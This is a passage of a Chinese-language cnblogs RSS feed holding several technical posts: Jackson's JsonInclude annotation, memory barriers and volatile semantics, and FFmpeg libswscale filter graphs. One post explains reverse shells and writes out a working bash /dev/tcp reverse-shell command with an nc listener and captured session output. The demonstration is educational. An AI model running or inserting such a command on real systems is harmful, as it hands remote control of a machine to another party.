&lt;ul&gt;&lt;li&gt;再次强调：valueFilter的equals方法返回true，意味着该字段&lt;span&gt;不会被序列化！！！&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;use_defaults&quot;&gt;USE_DEFAULTS&lt;/h3&gt;
&lt;p&gt;USE_DEFAULTS的用法也有点绕，咱们通过对比的方法来学习；&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;代码如下所示，在类和成员变量上都有JsonInclude注解，序列化field0的时候，是哪个注解生效呢？：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    @JsonInclude(JsonInclude.Include.NON_EMPTY)
    static class Test {

        @JsonInclude(JsonInclude.Include.NON_NULL)
        private List&amp;lt;String&amp;gt; field0;

        public List&amp;lt;String&amp;gt; getField0() { return field0; }

        public void setField0(List&amp;lt;String&amp;gt; field0) { this.field0 = field0; }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;把field0设置为空集合，运行代码试试，如果类上的注解生效，那么field0就不会被序列化（NON_EMPTY会过滤掉空集合），如果成员变量上的注解生效，field0就会被序列化（NON_NULL只过滤null，空集合不是null），执行结果如下图，可见是成员变量上的注解生效了：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084803808-246246315.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;接下来保持上述代码不变，仅在&lt;span&gt;getField0方法&lt;/span&gt;上添加JsonInclude注释，值是&lt;span&gt;USE_DEFAULTS&lt;/span&gt;，这样在序列化过程中，调用getField0方法时，就用类注解JsonInclude的值了，即NON_EMPTY：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@JsonInclude(JsonInclude.Include.USE_DEFAULTS)
public List&amp;lt;String&amp;gt; getField0() { 
        return field0; 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;执行修改后的代码，如下图所示，此时用的成员变量field0上的注解就不生效了，而是类注解生效，导致空集合不被序列化：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202102/485422-20210202084804657-1723253024.jpg&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;小结&lt;span&gt;USE_DEFAULTS&lt;/span&gt;的作用如下：&lt;br/&gt;a. 类注解和成员变量注解同时存在时，以成员变量注解为准；&lt;br/&gt;b. 如果对应的get方法也使用了JsonInclude注解，并且值是USE_DEFAULTS，此时以类注解为准；&lt;/p&gt;
&lt;p&gt;至此，JsonInclude注解的学习和实战就完成了，希望本文能给您提供参考，助您熟练使用注解来指定更精确的序列化过滤策略；&lt;/p&gt;
&lt;h3 id=&quot;你不孤单，欣宸原创一路相伴&quot;&gt;你不孤单，欣宸原创一路相伴&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105068742&quot; target=&quot;_blank&quot;&gt;Java系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086498&quot; target=&quot;_blank&quot;&gt;Spring系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086732&quot; target=&quot;_blank&quot;&gt;Docker系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086794&quot; target=&quot;_blank&quot;&gt;kubernetes系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086850&quot; target=&quot;_blank&quot;&gt;数据库+中间件系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/105086920&quot; target=&quot;_blank&quot;&gt;DevOps系列&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 02 Feb 2021 00:48:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/14360209.html</dc:identifier>
</item>
<item>
<title>反弹SHELL介绍及原理 - Cocowool</title>
<link>http://www.cnblogs.com/cocowool/p/reverse-shell.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cocowool/p/reverse-shell.html</guid>
<description>&lt;p&gt;如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。&lt;/p&gt;
&lt;h2 id=&quot;什么是反弹shell&quot;&gt;什么是反弹Shell&lt;/h2&gt;
&lt;p&gt;正常情况下，我们登陆服务器获取 Shell 会话是下面的步骤，用户在终端软件（Terminal）中输入 &lt;code&gt;ssh root@ip&lt;/code&gt; 登陆目标机器，登陆成功后即可以开始Shell操作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/39469/202102/39469-20210202084457245-2114711793.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;反弹Shell（Reverse Shell），顾名思义是指与正常的 sshd 服务相反，由控制端监听，被控制端发起请求到监听端口，并将其命令行的输入输出转到控制端。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/39469/202102/39469-20210202084510220-1183278468.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;实战介绍&quot;&gt;实战介绍&lt;/h2&gt;
&lt;p&gt;准备两台网络连通的服务器：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;控制端：172.16.51.130&lt;/li&gt;
&lt;li&gt;被控端：172.16.51.128&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;控制端监听一个端口&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sh&quot;&gt;$ nc -lvp 8888
listening on [any] 8888 ...

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;被控端生成一个反弹 Shell&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sh&quot;&gt;$ bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.51.130/8888 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这时注意观察控制端，会出现被控端的 shell 提示符&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sh&quot;&gt;172.16.51.128: inverse host lookup failed: Host name lookup failure
connect to [172.16.51.130] from (UNKNOWN) [172.16.51.128] 47584
tiago@lampiao:~$ whoami
whoami
tiago
tiago@lampiao:~$ hostname
hostname
lampiao
tiago@lampiao:~$ ip addr
ip addr
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:cc:9b:c6 brd ff:ff:ff:ff:ff:ff
    inet 172.16.51.128/24 brd 172.16.51.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fecc:9bc6/64 scope link 
       valid_lft forever preferred_lft forever
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在提示符下输入命令，可以看到确实是在被管机上执行的命令及返回的结果，就像我们登陆到了被管机一样。&lt;/p&gt;
&lt;p&gt;具体解释如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sh&quot;&gt;$ nc -lvp 8888
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用 nc 命令在控制端监听端口，&lt;code&gt;-l&lt;/code&gt; 表示监听 &lt;code&gt;-p&lt;/code&gt; 表示端口。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sh&quot;&gt;$ bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.51.130/8888 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1
# bash -i 表示进入一个交互式的Shell环境
# &amp;gt;&amp;amp; 表示将交互式Shell发送给后续的文件，并且将&amp;amp;联合符号后面的内容也发送到重定向
# /dev/tcp/172.16.51.130/8888 实际是 `bash` 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。
# 0&amp;gt;&amp;amp;1 表示将标准的输入与标准输出相结合，都发给重定向文件
# 2&amp;gt;&amp;amp;1 表示将标准输出和标准错误输出都发送到socket文件中，即我们能够在控制端看到命令的返回，在被控端看不到相关信息。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的命令联合起来意思就是，我们在被管机上产生了一个 bash 环境，将它发送给了远程的控制主机，同时将被管机的标准输入、标准输出、标准错误输出都发送给了控制主机，这样实现了获取被管主机 shell 执行环境的目的。&lt;/p&gt;
&lt;p&gt;本文介绍的是最简单的一种反弹shell实现方式，反弹shell还有很多种的实现方式，实现的思路应该都差不多，等稍后整理出来与大家分享。&lt;/p&gt;
</description>
<pubDate>Tue, 02 Feb 2021 00:46:00 +0000</pubDate>
<dc:creator>Cocowool</dc:creator>
<og:description>如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。 什么是反弹Shell 正常情况下，我们登陆服务</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/cocowool/p/reverse-shell.html</dc:identifier>
</item>
<item>
<title>内存屏障在CPU、JVM、JDK中的实现 - 等不到的口琴</title>
<link>http://www.cnblogs.com/Courage129/p/14360186.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Courage129/p/14360186.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;内存屏障（英语：Memory barrier），也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，它使得 CPU 或编译器在对内存进行操作的时候, 严格按照一定的顺序来执行, 也就是说在内存屏障之前的指令和内存屏障之后的指令不会由于系统优化等原因而导致乱序。&lt;/p&gt;
&lt;p&gt;大多数现代计算机为了提高性能而采取乱序执行，这使得内存屏障成为必须。&lt;/p&gt;
&lt;p&gt;语义上，内存屏障之前的所有写操作都要写入内存；内存屏障之后的读操作都可以获得同步屏障之前的写操作的结果。因此，对于敏感的程序块，写操作之后、读操作之前可以插入内存屏障。&lt;/p&gt;
&lt;h2 id=&quot;为什么要有内存屏障&quot;&gt;为什么要有内存屏障&lt;/h2&gt;
&lt;p&gt;因为&lt;strong&gt;重排序&lt;/strong&gt;,同步的目的是保证不同执行流对共享数据并发操作的一致性。在单核时代，使用原子变量就很容易达成这一目的。甚至因为CPU的一些访存特性，对某些内存对齐数据的读或写也具有原子的特性。但在多核架构下即使操作是原子的，仍然会因为其他原因导致同步失效。&lt;/p&gt;
&lt;p&gt;首先是现代编译器的代码优化和编译器指令重排可能会影响到代码的执行顺序。&lt;/p&gt;
&lt;p&gt;其次还有指令执行级别的乱序优化，流水线、乱序执行、分支预测都可能导致处理器次序（Process Ordering，机器指令在CPU实际执行时的顺序）和程序次序（Program Ordering，程序代码的逻辑执行顺序）不一致。可惜不影响语义依旧只能是保证单核指令序列间，单核时代CPU的Self-Consistent特性在多核时代已不存在（Self-Consistent即重排原则：有数据依赖不会进行重排，单核最终结果肯定一致）。&lt;/p&gt;
&lt;p&gt;除此还有硬件级别Cache一致性（Cache Coherence）带来的问题：CPU架构中传统的&lt;a href=&quot;https://www.cnblogs.com/Courage129/p/14213716.html&quot; target=&quot;_blank&quot;&gt;MESI协议&lt;/a&gt;中有两个行为的执行成本比较大。一个是将某个Cache Line标记为Invalid状态，另一个是当某Cache Line当前状态为Invalid时写入新的数据。所以CPU通过Store Buffer和Invalidate Queue组件来降低这类操作的延时。如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2002319/202102/2002319-20210202083542633-227675003.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当一个核心在Invalid状态进行写入时，首先会给其它CPU核发送Invalid消息，然后把当前写入的数据写入到Store Buffer中。然后异步在某个时刻真正的写入到Cache Line中。当前CPU核如果要读Cache Line中的数据，需要先扫描Store Buffer之后再读取Cache Line（Store-Buffer Forwarding）。但是此时其它CPU核是看不到当前核的Store Buffer中的数据的，要等到Store Buffer中的数据被刷到了Cache Line之后才会触发失效操作。&lt;/p&gt;
&lt;p&gt;而当一个CPU核收到Invalid消息时，会把消息写入自身的Invalidate Queue中，随后异步将其设为Invalid状态。和Store Buffer不同的是，当前CPU核心使用Cache时并不扫描Invalidate Queue部分，所以可能会有极短时间的脏读问题。这里的Store Buffer和Invalidate Queue的说法是针对一般的SMP架构来说的，不涉及具体架构。&lt;/p&gt;
&lt;p&gt;内存对于缓存更新策略，要区分Write-Through和Write-Back两种策略。前者更新内容直接写内存并不同时更新Cache，但要置Cache失效，后者先更新Cache，随后异步更新内存。通常X86 CPU更新内存都使用Write-Back策略。&lt;/p&gt;
&lt;h2 id=&quot;编译器屏障-compiler-barrior&quot;&gt;编译器屏障 Compiler Barrior&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;/* The &quot;volatile&quot; is due to gcc bugs */
#define barrier() __asm__ __volatile__(&quot;&quot;: : :&quot;memory&quot;) 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;阻止编译器重排，保证编译程序时在优化屏障之前的指令不会在优化屏障之后执行。&lt;/p&gt;
&lt;h2 id=&quot;cpu屏障-cpu-barrior&quot;&gt;CPU屏障 CPU Barrior&lt;/h2&gt;
&lt;p&gt;CPU级别内存屏障其作用有两个：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;防止指令之间的重排序&lt;/li&gt;
&lt;li&gt;保证数据的可见性&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;指令重排中Load和Store两种操作会有Load-Store、Store-Load、Load-Load、Store-Store这四种可能的乱序结果。&lt;/p&gt;
&lt;p&gt;Intel为此提供三种内存屏障指令：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;sfence ，实现Store Barrior 会将store buffer中缓存的修改刷入L1 cache中，使得其他cpu核可以观察到这些修改，而且之后的写操作不会被调度到之前，即sfence之前的写操作一定在sfence完成且全局可见；&lt;/li&gt;
&lt;li&gt;lfence ，实现Load Barrior 会将invalidate queue失效，强制读取入L1 cache中，而且lfence之后的读操作不会被调度到之前，即lfence之前的读操作一定在lfence完成（并未规定全局可见性）；&lt;/li&gt;
&lt;li&gt;mfence ，实现Full Barrior 同时刷新store buffer和invalidate queue，保证了mfence前后的读写操作的顺序，同时要求mfence之后写操作结果全局可见之前，mfence之前写操作结果全局可见；&lt;/li&gt;
&lt;li&gt;lock 用来修饰当前指令操作的内存只能由当前CPU使用，若指令不操作内存仍然由用，因为这个修饰会让指令操作本身原子化，而且自带Full Barrior效果；还有指令比如IO操作的指令、exch等原子交换的指令，任何带有lock前缀的指令以及CPUID等指令都有内存屏障的作用。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;X86-64下仅支持一种指令重排：Store-Load ，即读操作可能会重排到写操作前面，同时不同线程的写操作并没有保证全局可见，例子见《Intel® 64 and IA-32 Architectures Software Developer’s Manual》手册8.6.1、8.2.3.7节。要注意的是这个问题只能用mfence解决，不能靠组合sfence和lfence解决。（用sfence+lfence组合仅可以解决重排问题，但不能解决全局可见性问题，简单理解不如视为sfence和lfence本身也能乱序重拍）&lt;/p&gt;
&lt;p&gt;X86-64一般情况根本不会需要使用lfence与sfence这两个指令，除非操作Write-Through内存或使用 non-temporal 指令（NT指令，属于SSE指令集），比如movntdq, movnti, maskmovq，这些指令也使用Write-Through内存策略，通常使用在图形学或视频处理，Linux编程里就需要使用GNC提供的专门的函数（例子见参考资料13：Memory part 5: What programmers can do）。&lt;/p&gt;
&lt;p&gt;下面是GNU中的三种内存屏障定义方法，结合了编译器屏障和三种CPU屏障指令&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;#define lfence() __asm__ __volatile__(&quot;lfence&quot;: : :&quot;memory&quot;) 
#define sfence() __asm__ __volatile__(&quot;sfence&quot;: : :&quot;memory&quot;) 
#define mfence() __asm__ __volatile__(&quot;mfence&quot;: : :&quot;memory&quot;) 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代码中仍然使用lfence()与sfence()这两个内存屏障应该也是一种长远的考虑。按照Interface写代码是最保险的，万一Intel以后出一个采用弱一致模型的CPU，遗留代码出问题就不好了。目前在X86下面视为编译器屏障即可。&lt;/p&gt;
&lt;p&gt;GCC 4以后的版本也提供了Built-in的屏障函数&lt;code&gt;__sync_synchronize()&lt;/code&gt;，这个屏障函数既是编译屏障又是内存屏障，代码插入这个函数的地方会被安插一条&lt;code&gt;mfence&lt;/code&gt;指令。&lt;/p&gt;
&lt;p&gt;C++11为内存屏障提供了专门的函数std::atomic_thread_fence，方便移植统一行为而且可以配合内存模型进行设置，比如实现Acquire-release语义：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;atomic&amp;gt;
std::atomic_thread_fence(std::memory_order_acquire);
std::atomic_thread_fence(std::memory_order_release);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;内存模型&quot;&gt;&lt;strong&gt;内存模型&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;acquire与release语义&quot;&gt;Acquire与Release语义&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;对于Acquire来说，保证Acquire后的读写操作不会发生在Acquire动作之前&lt;/li&gt;
&lt;li&gt;对于Release来说，保证Release前的读写操作不会发生在Release动作之后&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Acquire &amp;amp; Release 语义保证内存操作仅在acquire和release屏障之间发生&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2002319/202102/2002319-20210202083613142-2097002053.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;X86-64中Load读操作本身满足Acquire语义，Store写操作本身也是满足Release语义。但Store-Load操作间等于没有保护，因此仍需要靠mfence或lock等指令才可以满足到Synchronizes-with规则。&lt;/p&gt;
&lt;h3 id=&quot;happens-before&quot;&gt;Happens-before&lt;/h3&gt;
&lt;p&gt;相对于Synchronizes-with规则更宽松，happens-before规则定义指令执行顺序与变量的可见性，类似偏序关系，具有可传递性，因此可以运用于并行逻辑分析。&lt;/p&gt;
&lt;p&gt;Happens-before关系是对在一个线程内执行的操作在另一个线程内的操作的可见性保证。&lt;/p&gt;
&lt;p&gt;Happens-before 定义程序中所有操作的偏序关系。为了保证操作 Y 的执行线程能观察到操作 X 的结果（不管 X 和 Y 是否发生在不同的线程内），就必须在 X 和 Y 之间存在 Happens-before 关系。如果在两个操作之间缺少 happens-before 顺序，那么 JVM 会任意地对操作进行重排序（JIT 编译优化）。&lt;/p&gt;
&lt;p&gt;Happens-before不仅仅是在时序上对操作进行重排序，它也是对内存读写顺序的保证。两个线程执行内存的读写操作可以在时间上对相互间的操作保持一致，但是可能不能一致地观察到彼此的改变（内存一致性错误），除非它们之间存在 happens-before 关系。&lt;/p&gt;
&lt;h3 id=&quot;内存一致性模型-memory-model&quot;&gt;内存一致性模型 Memory Model&lt;/h3&gt;
&lt;p&gt;内存一致性模型从程序员视角，由内存序Memory Ordering和写操作原子性Store Atomicity来定义，针对不同线程中原子操作的全局顺序：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Strong Consistency / Sequential consistency 顺序一致性&lt;/li&gt;
&lt;li&gt;Release Consistency / release-acquire / release-consume&lt;/li&gt;
&lt;li&gt;Relaxed Consistency&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;C++11相应定义了6种内存模型：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;std::memory_order_seq_cst 所有读写操作不能跨过，写顺序全线程可见&lt;/li&gt;
&lt;li&gt;std::memory_order_acq_rel 所有读写操作不能跨过，写顺序仅同步线程间可见、std::memory_order_release 所有读写操作不能往后乱序、std::memory_order_acquire 所有读写操作不能向前乱序、std::memory_order_consume 依赖该读操作的后续读写操作不能向前乱序&lt;/li&gt;
&lt;li&gt;std::memory_order_relaxed 无特殊要求&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;volatile-关键字&quot;&gt;volatile 关键字&lt;/h2&gt;
&lt;p&gt;voldatile关键字首先具有“易变性”，声明为volatile变量编译器会强制要求读内存，相关语句不会直接使用上一条语句对应的的寄存器内容，而是重新从内存中读取。&lt;/p&gt;
&lt;p&gt;其次具有”不可优化”性，volatile告诉编译器，不要对这个变量进行各种激进的优化，甚至将变量直接消除，保证代码中的指令一定会被执行。&lt;/p&gt;
&lt;p&gt;最后具有“顺序性”，能够保证Volatile变量间的顺序性，编译器不会进行乱序优化。不过要注意与非volatile变量之间的操作，还是可能被编译器重排序的。&lt;/p&gt;
&lt;p&gt;需要注意的是其含义跟原子操作无关，比如：volatile int a; a++; 其中a++操作实际对应三条汇编指令实现”读-改-写“操作（RMW），并非原子的。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;思考：bool类型是不是适合使用，不会出问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不同编程语言中voldatile含义与实现并不完全相同，Java语言中voldatile变量可以被看作是一种轻量级的同步，因其还附带了acuire和release语义。实际上也是从JDK5以后才通过这个措施进行完善，其volatile 变量具有 synchronized 的可见性特性，但是不具备原子特性。Java语言中有volatile修饰的变量，赋值后多执行了一个“load addl $0x0, (%esp)”操作，这个操作相当于一个lock指令，就是增加一个完全的内存屏障指令，这点与C++实现并不一样。volatile 的读性能消耗与普通变量几乎相同，但是写操作稍慢，因为它需要在本地代码中插入许多内存屏障指令来保证处理器不发生乱序执行。&lt;/p&gt;
&lt;p&gt;Java实践中仅满足下面这些条件才应该使用volatile关键字：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;变量写入操作不依赖变量当前值，或确保只有一个线程更新变量的值（Java可以，C++仍然不能）&lt;/li&gt;
&lt;li&gt;该变量不会与其他变量一起纳入&lt;/li&gt;
&lt;li&gt;变量并未被锁保护&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;C++中voldatile等于插入编译器级别屏障，因此并不能阻止CPU硬件级别导致的重排。C++11 中volatile语义没有任何变化，不过提供了std::atomic工具可以真正实现原子操作，而且默认加入了内存屏障（可以通过在store与load操作时设置内存模型参数进行调整，默认为std::memory_order_seq_cst）。&lt;/p&gt;
&lt;p&gt;C++实践中推荐涉及并发问题都使用std::atomic，只有涉及特殊内存操作的时候才使用volatile关键字。这些情况通常IO相关，防止相关操作被编译器优化，也是volatile关键字发明的本意。&lt;/p&gt;
&lt;h2 id=&quot;站在巨人的肩膀上&quot;&gt;站在巨人的肩膀上&lt;/h2&gt;
&lt;ol readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/43526907&quot; target=&quot;_blank&quot;&gt;volatile与内存屏障总结&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/0909ec597e02&quot; target=&quot;_blank&quot;&gt;Java - Happens-before relationship&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://preshing.com/20120913/acquire-and-release-semantics/&quot; target=&quot;_blank&quot;&gt;Acquire and Release Semantics&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Tue, 02 Feb 2021 00:38:00 +0000</pubDate>
<dc:creator>等不到的口琴</dc:creator>
<og:description>前言 内存屏障（英语：Memory barrier），也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，它使得 CPU 或编译器在对内存进行操作的时候, 严格按照一定的顺序来执行, 也就是说在内</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Courage129/p/14360186.html</dc:identifier>
</item>
<item>
<title>FFmpeg libswscale源码分析2-转码命令行与滤镜图 - 叶余</title>
<link>http://www.cnblogs.com/leisure_chn/p/14355015.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leisure_chn/p/14355015.html</guid>
<description>&lt;p&gt;本文为作者原创，转载请注明出处：&lt;a href=&quot;https://www.cnblogs.com/leisure_chn/p/14355015.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/leisure_chn/p/14355015.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;libswscale 源码分析系列文章：&lt;br/&gt;[1]. &lt;a href=&quot;https://www.cnblogs.com/leisure_chn/p/14349382.html&quot; target=&quot;_blank&quot;&gt;FFmpeg libswscale源码分析1-API介绍&lt;/a&gt;&lt;br/&gt;[2]. &lt;a href=&quot;https://www.cnblogs.com/leisure_chn/p/14355015.html&quot; target=&quot;_blank&quot;&gt;FFmpeg libswscale源码分析2-转码命令行与滤镜图&lt;/a&gt;&lt;br/&gt;[3]. &lt;a href=&quot;https://www.cnblogs.com/leisure_chn/p/14355017.html&quot; target=&quot;_blank&quot;&gt;FFmpeg libswscale源码分析3-scale滤镜源码分析&lt;/a&gt;&lt;br/&gt;[4]. &lt;a href=&quot;https://www.cnblogs.com/leisure_chn/p/14355019.html&quot; target=&quot;_blank&quot;&gt;FFmpeg libswscale源码分析4-libswscale源码分析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;源码分析基于 FFmpeg 4.1 版本。&lt;/p&gt;
&lt;h2 id=&quot;2-转码命令行与滤镜图&quot;&gt;2. 转码命令行与滤镜图&lt;/h2&gt;
&lt;p&gt;本节从 ffmpeg 转码命令开始，引入一个完整的示例：hevc yuv422p10le 源软解硬编为 hevc yuv420p10le 视频。&lt;/p&gt;
&lt;p&gt;第 2 节、第 3 节、第 4 节是由上到下分层的关系。第 2 节介绍命令行，通过命令行调用 ffmpeg 进程。第 3 节介绍 scale 滤镜，ffmpeg 进程使用了 scale 滤镜，scale 滤镜中会调用 libswscale 库。第 4 节介绍 libswscale 库。&lt;/p&gt;
&lt;p&gt;查看 ffmpeg 中 hevc_nvenc 支持的像素格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[root@node0 ~]# ffmpeg -hide_banner -h encoder=hevc_nvenc | grep &quot;pixel formats&quot; 
    Supported pixel formats: yuv420p nv12 p010le yuv444p p016le yuv444p16le bgr0 rgb0 cuda
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在如下代码 for 循环处打断点，分析滤镜图中的各个滤镜输入输出像素格式：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;static int graph_config_links(AVFilterGraph *graph, AVClass *log_ctx)
{
    AVFilterContext *filt;
    int i, ret;

    for (i = 0; i &amp;lt; graph-&amp;gt;nb_filters; i++) {
        filt = graph-&amp;gt;filters[i];

        if (!filt-&amp;gt;nb_outputs) {
            if ((ret = avfilter_config_links(filt)))
                return ret;
        }
    }

    return 0;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不显式指定滤镜的转码命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ffmpeg -hide_banner -y -re -i ./hevc_4k_422_10b_5994_60m_vibe.ts 
-c:v hevc_nvenc -preset fast -profile:v main10 -c:a aac -f mpegts /dev/null
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;滤镜图如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;         yuv422p10le   yuv422p10le    yuv444p16le     yuv444p16le
[buffer] -----&amp;gt; [null] -----&amp;gt; [scale] -----&amp;gt; [format] -----&amp;gt; [buffersink]
&lt;/code&gt;
&lt;/pre&gt;
